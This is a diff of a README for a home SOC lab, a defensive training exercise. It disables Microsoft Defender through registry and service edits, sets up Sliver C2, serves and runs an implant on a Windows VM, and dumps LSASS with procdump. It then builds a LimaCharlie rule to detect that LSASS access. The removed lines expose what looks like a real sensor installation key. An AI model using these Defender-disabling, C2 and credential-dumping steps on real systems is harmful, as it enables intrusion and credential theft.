@@ -1,127 +1,168 @@
 # Home-SOC-Lab-Build-Simulate-Detect
-## Disable Defender on Windows VM
-1. Windows Security > Virus & threat protection settings > toggle off "Real-time protection, Cloud-delivered protection ,Automatic sample submission and Tamper Protection".
 
-   ![Resource Group Screenshot](Document_Images/images1.png)
+## 1. Disable Defender on Windows VM
+Step 1 – Turn Off from Windows Security
+1. Go to Windows Security > Virus & threat protection settings.
+2. Toggle off:
+  - Real-time protection
+  - Cloud-delivered protection
+  - Automatic sample submission
+  - Tamper Protection
 
-2. Run > gpedit.msc > Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus > Turn off Microsoft Defender Antivirus > Enable > Apply and OK
+    ![Resource Group Screenshot](Document_Images/images1.png)
+
+Step 2 – Disable via Group Policy
+1. Press `Win + R`, type `gpedit.msc`, and press **Enter**.
+2. Navigate to:
+Computer Configuration > Administrative Templates > Windows Components > Microsoft Defender Antivirus
+3. Open **Turn off Microsoft Defender Antivirus** → Set to **Enabled** → Apply → OK.
 
    ![Resource Group Screenshot](Document_Images/images2.png)
 
-3.Permanently Disable Defender via Registry
+Step 3 – Disable via Registry
 
-Cmd (administrator)> type : REG ADD "hklm\software\policies\Microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+ **Cmd (administrator)** type : 
 
-   ![Resource Group Screenshot](Document_Images/images3.png)
+`REG ADD "hklm\software\policies\Microsoft\windows defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f` 
+.
+	     ![Resource Group Screenshot](Document_Images/images3.png)
+
  
-4.Go to mscongfig.exe > Boot > click Safe boot - Minimal > Appy and ok then restart
+Step 4 – Boot into Safe Mode
+1. Run msconfig.exe.
+2. Under Boot, check Safe boot (Minimal) → Apply → OK → Restart.
 
    ![Resource Group Screenshot](Document_Images/images4.png)
 
-5. After restart will in to Safe mode
+Step 5 – Disable Services in Safe Mode
 
-6.Registry Editor > HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\Sense > click start set value data to 4 and Base Hexadecimal then ok.
-   
-   ![Resource Group Screenshot](Document_Images/images5.png)
+1. Open Registry Editor (`regedit`).
 
-7.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdBoot > click start set value data to 4 and Base Hexadecimal then ok.
+2. Modify the `Start` value to 4 (Hexadecimal) for the following keys:
+  - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdBoot` 
+  - `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WinDefend`
+  -	`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdNisDrv`
+  -	`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdNisSvc`
+  -	`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdFilter` 
 
+    ![Resource Group Screenshot](Document_Images/images5.png)
 
-8.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WinDefend > click start set value data to 4 and Base Hexadecimal then ok.
+Step 6 – Return to Normal Boot
+  -	In `msconfig.exe`, uncheck **Safe boot** and restart.
 
+---
 
-9.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdNisDrv > click start set value data to 4 and Base Hexadecimal then ok.
+## 2. Install Sysmon on Windows VM
 
+Open **Windows PowerShell (Administrator)** 
 
-10.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdNisSvc > click start set value data to 4 and Base Hexadecimal then ok.
+Step 1 – Download Sysmon :
 
+`Invoke-WebRequest - Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip`
 
-11.HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Service\WdFilter > click start set value data to 4 and Base Hexadecimal then ok.
+Step 2 – Extract Files :
 
+`Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon`
 
-12. Go back to mscongfig.exe > Boot > unclick Safe boot 
+Step 3 – Download Sysmon Config :
 
+`Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml`
 
-Install Sysmon on Windows VM
-1. Windows PowerShell (Administrator) > Invoke-WebRequest - Uri https://download.sysinternals.com/files/Sysmon.zip -OutFile C:\Windows\Temp\Sysmon.zip
-2.After done download expand > Expand-Archive -LiteralPath C:\Windows\Temp\Sysmon.zip -DestinationPath C:\Windows\Temp\Sysmon
-3.Download SwifitOnSecurity's Sysmon config.
-Invoke-WebRequest -Uri https://raw.githubusercontent.com/SwiftOnSecurity/sysmon-config/master/sysmonconfig-export.xml -OutFile C:\Windows\Temp\Sysmon\sysmonconfig.xml
-4.Install Sysmon with Swift's config
-C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i
-C:\Windows\Temp\Sysmon\sysmonconfig.xml
+Step 4 – Install Sysmon :
 
+`C:\Windows\Temp\Sysmon\Sysmon64.exe -accepteula -i C:\Windows\Temp\Sysmon\sysmonconfig.xml`
 
-Installing LimaCharile agent andLimaCharlie Portal
-Open Browser> limacharlie.io >login 
-Create a new organization
-Then Add sensor > select Windows > Create new - Enter your Decription as "Windows VM lab"
+---
+
+## 3. Install LimaCharlie Agent
+
+Step 1 – Create Organization in LimaCharlie.io
+
+1. Log in to LimaCharlie.io.
+2. Create a new organization.
+3. Add a sensor → Select **Windows** → Create new → Name it “Windows VM Lab”.
 
    ![Resource Group Screenshot](Document_Images/images11.png)
 
-After created select the Installation Key we just created
+
+Step 2 – Download and Install Agent
+
+1. Select the x86-64 .exe sensor and hold on first.
+
+ 	 ![Resource Group Screenshot](Document_Images/images13.png)
    
-   ![Resource Group Screenshot](Document_Images/images12.png)
+2. On the Windows VM, download:
 
-Select x86-64(.exe) and skip ahead to Windows VM first
-
-   ![Resource Group Screenshot](Document_Images/images13.png)
-
-In Windows VM go to web browser download :
-https://downloads.limacharlie.io/sensor/windows/64 
+	`https://downloads.limacharlie.io/sensor/windows/64`
 
    ![Resource Group Screenshot](Document_Images/images14.png)
 
-Go to Cmd (Administrator) following command
+3. In Command Prompt (Admin):
+   1. `cd C:\Users\User\Downloads`
+   2. `hcp_win_x64_release_4.33.13 -i <installation_key>`
+      
+    ![Resource Group Screenshot](Document_Images/images15.png)  copy installation_key
 
-cd C:\Users\User\Downloads
+    ![Resource Group Screenshot](Document_Images/images16.png)
 
-Now we install command provided by LimaCharlie which contain installation key
-   
-   ![Resource Group Screenshot](Document_Images/images15.png)
-
-command:
-hcp_win_x64_release_4.33.13 -i AAAABgAAAQsFAAAAIzkxNTc3OThjNTBhZjM3MmMubGMubGltYWNoYXJsaWUuaW8AAAABEAIBuwAAAQwFAAAAIzkxNTc3OThjNTBhZjM3MmMubGMubGltYWNoYXJsaWUuaW8AAAABEQIBuwAAAAiBAAAABQAAAAUHAAAAEAl5saLE0kA7vpwqHt6VX4MAAAAJBwAAABC7cIafZnJBE7AHHFS39htSAAAABAcAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAcDAAAAAAAAAAYDAAAAAAAAAQ4HAAABJjCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAL2SpxyNrur8WPuRUzJqn8rXqc1hMD/E2sy4lWZrafMcD0BIpxHEDWRj0NvNkUTa55RPAws5CPEiOiVrxfHYjrpXWxF8kzjZMFJZn/kWDFIqWEol9EwBKJZBOBe1D/MqSBOkHrfGe0+AbCpAERDpsZFzlPfMpyAijnyyNDxIgBYle/aDQmmitf4w1Tx3w46q/ND/XR24EJL/1zqwwG61GUCoL3VV/DToqWYXCY7Swdt8f1hicr8QgSVVeJ8o4/qTVKP9S40QuZe0fpiEEOW0eDUnpIg3uMUHp2QDulwXjKh6HuD7i8DUkXX37hzcJdMEsdcg+ZBo8Zwzo70tDDvDvW8CAwEAAQ==
-
-   ![Resource Group Screenshot](Document_Images/images16.png)
-
-after install the limacharlie webpage will appear "Detected new sensor!"
+After installing the Limacharlie the webpage will appear "Detected new sensor!"
 
    ![Resource Group Screenshot](Document_Images/images17.png)
 
-Now go to select the organizations just we created> sensors > Artifact collection > click "Add rule"
+Step 3 – Enable Sysmon Log Collection
 
-   ![Resource Group Screenshot](Document_Images/images18.png)
+1. Go to your organization in LimaCharlie → Sensors → Artifact Collection → Add Rule.
 
-Name: windows-sysmon-logs
-Platforms: Windows
-Path Pattern:wel://MIcrosoft-Windows-Sysmon/Operational:*
-Retention Period:10
-Click "Save Rule"
+  - Name: `windows-sysmon-logs`
 
-   ![Resource Group Screenshot](Document_Images/images19.png)
+  - Platforms: `Windows`
+
+  - Path Pattern: `wel://Microsoft-Windows-Sysmon/Operational:*`
+
+  - Retention: `10 days`
+    
+    ![Resource Group Screenshot](Document_Images/images18.png)
+
+    ![Resource Group Screenshot](Document_Images/images19.png)
 
 
-## Setup Attack System Sliver C2
-On Ubuntu upgrade to root mode "sudo su" and enter your password
-(Document_Images/images20.png)
-In the screenshot above,our VM has the IP address of 192.168.137.132/24.This IP is assigned automatically (DHCP)by VMware and could change in the fuitture so we next want to statically assign it so that it does not change.
-a. Take note of the device name of the ethernet adapter as well, at the parent level above the IP address. In case, it is ens33 - we need that in the next step.
-b. Write down the Linux VM's IP address because you need it multiple times throughout this guide.
+## 4. Set Up Attack System (Sliver C2)
 
-Let's find VM IP address using as a gateway.
+Step 0 – Identify Network Details
+1. On the Ubuntu VM, switch to root `sudo su`.
+2. Check the network interface name and IP `ip a`.
+   
+In this example:
+
+   - Interface: `ens33`
+
+   - IP Address: `192.168.137.132/24` (assigned via DHCP — may change later)
+
+Tip: Write down your interface name and IP address; you’ll need them multiple times.
+
+   ![Resource Group Screenshot](Document_Images/images20.png)
+
+3. Check the VM’s gateway:
+
+bash
+
 "ping _gateway -c 1"
 
    ![Resource Group Screenshot](Document_Images/images21.png)
 
-192.168.137.2
+Step 1 – Static IP on Ubuntu
 
+Edit the Netplan config:
 
-Now we write a yaml the configuration file of the network manager "netplan"
+bash
 
-sudo nano /etc/netplan/00-installer-config.yaml
+`sudo nano /etc/netplan/00-installer-config.yaml`
 
-network:
+Example:
+
+yaml
+
+`network:
    ethernets:
      ens33:
        dhcp4: no
@@ -129,173 +170,216 @@ network:
        gateway4: 192.168.2.2
        nameservers:
 	 addresses: [8.8.8.8,8.8.4.4]
- version: 2
+ version: 2`
 
    ![Resource Group Screenshot](Document_Images/images22.png)
 
-Save the file and test your new configuration for errors, ignore the warning about gateway4 being deprecated
+Apply and verify:
 
-sudo netplan try
+bash
 
-Apply the configuration 
-
-sudo netplan apply
-
-After apply check the connectivity, ping Google DNS.
-
-ping 8.8.8.8
+- `sudo netplan apply`
+- `ping 8.8.8.8`
 
    ![Resource Group Screenshot](Document_Images/images23.png)
 
-Now statically assigned IP address that should not change, let's SSH onto the VM from your host system to make future CLI activities easier thanks to copy and paste
+Step 2 – SSH into the Ubuntu VM from Windows
 
-I using my Windows system to use SSH client. cmd (admin) and run.
-ssh user@[Linux_VM_IP]
+From Windows (Admin Command Prompt):
+
+cmd
+
+`ssh user@[Linux_VM_IP]`
 
    ![Resource Group Screenshot](Document_Images/images24.png)
 
-Now on the new SSH session , drop into a root shell.
-sudo su
+Switch to root:
 
-Download Sliver, C2 framework by BishopFox.
+bash
+
+`sudo su`
+
+Step 3 – Install Sliver
+
+bash
+
 # Download Sliver Linux server binary
-wget https://github.com/BishopFox/sliver/releases/download/v1.5.32/sliver-server_linux -O /user/local/bin/sliver-server
+
+`wget https://github.com/BishopFox/sliver/releases/download/v1.5.32/sliver-server_linux -O /user/local/bin/sliver-server`
 
 # Make it executable
-chmod +x /usr/local/bin/sliver-server
 
-#install mingw-w64 for additional capabilities
-apt install -y mingw-w64
+`chmod +x /usr/local/bin/sliver-server`
 
-Now create a working directory will use in future steps
+# Install mingw-w64 for additional capabilities
+
+`apt install -y mingw-w64`
+
 # Create and enter our working directory
-mkdir -p /opt/sliver
 
-## Generate C2 Payload
+`mkdir -p /opt/sliver`
 
-Launch Sliver server
+## 5. Start Command & Control Session
 
-sliver-server
+Step 1 – Launch Sliver Server
+bash
+
+`sliver-server`
 
    ![Resource Group Screenshot](Document_Images/images25.png)
 
-Generate first C2 session payload . Use your Linux VM's IP address set in part 1.
+Step 2 – Generate Payload
+bash
 
-generate --http [Linux_VM_IP] --save /opt/sliver
+`generate --http [Linux_VM_IP] --save /opt/sliver`
 
    ![Resource Group Screenshot](Document_Images/images26.png)
 
 Take note the output file will randomized name.
 
-Confirm new implant configuration
-implants
+Check implant list:
+
+bash
+
+`implants`
 
    ![Resource Group Screenshot](Document_Images/images27.png)
 
-Now have a C2 payload we can drop onto out Windows VM. Exit sliver for now.
+Exit Sliver:
 
-exit
+bash
 
-Now download C2 payload from the Linux VM to the Windows VM. Use python trick that spins up a temporary web server.
-cd /opt/sliver
-python3 -m http.server 80
+`exit`
 
-Switch to Windows VM and launch an Administrative PowerShell.
-IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe
+Step 3 – Transfer Payload to Windows VM
+On Linux:
+
+bash
+
+`cd /opt/sliver`
+
+`python3 -m http.server 80`
+
+On Windows (Admin PowerShell):
+
+powershell
+
+`IWR -Uri http://[Linux_VM_IP]/[payload_name].exe -Outfile C:\Users\User\Downloads\[payload_name].exe`
 
    ![Resource Group Screenshot](Document_Images/images28.png)
 
 
-## Start Command and Control Session
-1. Now the payload is on the Windows VM, we switch back to Linux VM SSH session and enable Sliver HTTP server to catch the callback.
-a. Terminate the python web server we started pressing " Ctrl + c "
-b. Relaunch Sliver
+## 5. Start Command and Control Session
 
-sliver-server
+On Windows:
 
-c. Start Sliver HTTP listener
+1. Stop Python server (`Ctrl+C`).
 
-http
+2. Start Sliver:
+
+`sliver-server`
+
+`http`
 
    ![Resource Group Screenshot](Document_Images/images29.png)
+   
 
-2. Return Windows VM and execute C2 payload from download location using administrative PowerShell prompt we had from before
+3. Return Windows VM and execute C2 payload from download location using administrative PowerShell prompt we had from before
 
-C:\Users\bside\Downloads\NEAT_PUFFIN.exe
+poweshell
 
-3.After connect, you should see your session check in on Sliver server.
+`C:\Users\bside\Downloads\NEAT_PUFFIN.exe`
+
+
+4. After connect, you should see your session check in on Sliver server.
 
    ![Resource Group Screenshot](Document_Images/images30.png)
 
-4. Verify your session in Sliver
 
-sessions
+5. On Windows verify your session in Sliver 
+
+bash
+
+`sessions`
 
    ![Resource Group Screenshot](Document_Images/images31.png)
 
-5. To interact with your new C2 session, type following command into Sliver shell
-user [session_id]
+6. To interact with your new C2 session, type following command into Sliver shell
+
+bash
+
+`user [session_id]`
 
    ![Resource Group Screenshot](Document_Images/images32.png)
 
-6. Now you interacting directly with C2 session on Windows VM. Let run a few basic command to get our bearing on the victim host.
-a. Get basic info of session
-info
-whoami
 
-b. let's privileges
-getprivs
+7. Run some basic commands:
+
+`bash`
+`info`
+`whoami`
+#privileges
+`getprivs`
 
    ![Resource Group Screenshot](Document_Images/images33.png)
 
-c. Examine network connections occurring of the remote system
+Examine network connections occurring on the remote system
 netstat
 
    ![Resource Group Screenshot](Document_Images/images34.png)
 
-## Observer EDR Telementry
-Go to LimaCharlie (EDR) Sensor List > select Windows sensor
-images35
-On the left-side menu of this sensor,click "Processes"
-Then will see the "NEAT_PUFFIN.exe" , attack source IP.
+## 6.Observe EDR Telemetry in LimaCharlie
+Step 1 – Identify the Malicious Process
+1. In LimaCharlie, go to Sensors and select the Windows sensor
+
+   ![Resource Group Screenshot](Document_Images/images35.png)
+
+2. In the left-hand menu, click Processes.
+Look for the suspicious process `NEAT_PUFFIN.exe` and note the source IP address.
 
    ![Resource Group Screenshot](Document_Images/images36.png) ![Resource Group Screenshot](Document_Images/images37.png)
 
-The network log also can see the "NEAT_PUFFIN.exe".
+3. Check the Network tab — you should also see `NEAT_PUFFIN.exe` appearing in network connection logs.
 
    ![Resource Group Screenshot](Document_Images/images38.png) ![Resource Group Screenshot](Document_Images/images39.png)
 
-Now let's Detect it
-Go the Timeline filter search "SENSITIVE_PROCESS_ACCESS"events.Pick any one of them as there will se the system legitimately accessing lsass.
+Step 2 – Search for Suspicious Activity
+1. Open the Timeline view.
+2. Filter for the event type:
 
-   ![Resource Group Screenshot](Document_Images/images40.png)
+`SENSITIVE_PROCESS_ACCESS`
 
-Now craft a detection & response (D&R) rule that would alert anytime this activity occurs.
-a. click the button "Build D&R rule"
-
+3. Select any matching event where the system is accessing `lsass.exe` — this is often used for credential dumping.
+   
+    ![Resource Group Screenshot](Document_Images/images40.png)
+   
+Step 3 – Create a Detection & Response (D&R) Rule
+1. Click Build D&R Rule.
+   
    ![Resource Group Screenshot](Document_Images/images41.png)
 
-b. In the "Detect" section of the new rule, remove all contents and replace them with this.
-event: SENSITIVE_PROCESS_ACCESS
+2. In the Detect section, replace all contents with:
+   
+`event: SENSITIVE_PROCESS_ACCESS
 op: ends with
 path: event/*/TARGET/FILE_PATH
-value: lsass.exe
+value: lsass.exe`
 
 
-c. In the "respond" section of the new rule, remove all contents and replace them with this and create.
-- action: report
-  name: LSASS access
+3. In the Respond section, replace all contents with:
+` - action: report
+  name: LSASS access`
 
    ![Resource Group Screenshot](Document_Images/images42.png)
 
-Let's do it again with attack and with detections.
+Step 4 – Test the Detection
+1. From your Sliver server console, run:
 
-1. Return to your Sliver server console 
-procdump -n lsass.exe -s lsass.dmp
+`procdump -n lsass.exe -s lsass.dmp`
 
    ![Resource Group Screenshot](Document_Images/images43.png)
 
-2.Go to Limacharlie > Detections will appear LSASS access report .
+2. Go to LimaCharlie → Detections and confirm the `LSASS access` report appears.
 
    ![Resource Group Screenshot](Document_Images/images44.png) 
 
